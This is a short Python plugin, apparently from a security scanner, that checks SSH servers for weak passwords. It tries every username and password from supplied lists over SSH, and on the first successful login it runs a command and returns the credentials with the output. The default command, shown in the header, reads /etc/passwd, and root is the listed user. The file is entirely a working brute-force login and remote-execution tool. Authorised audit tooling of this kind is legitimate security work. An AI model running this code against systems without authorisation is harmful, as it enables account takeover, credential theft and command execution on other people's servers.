# SSHWeakPass|cat / etc/passwd|严重||3000|22|ssh|ssh|root|SSH弱密码|
# -*- coding:utf-8 -*-
from pexpect import pxssh


def check(ip, domain, port, args, timeout, payload_map):
    username_list = payload_map.get('username')
    password_list = payload_map.get('password')

    try:
        for username in username_list:
            for password in password_list:
                try:
                    ssh = pxssh.pxssh()
                    ssh.login(server=ip, port=port, username=username,
                              password=password, login_timeout=int(timeout))
                    ssh.sendline(args)
                    ssh.prompt()
                    result = "用户名密码: " + username + ":" + password
                    result = result + ssh.before.decode().replace(args, '')
                    ssh.logout()
                    return result
                except pxssh.ExceptionPxssh:
                    pass
    except Exception:
        raise
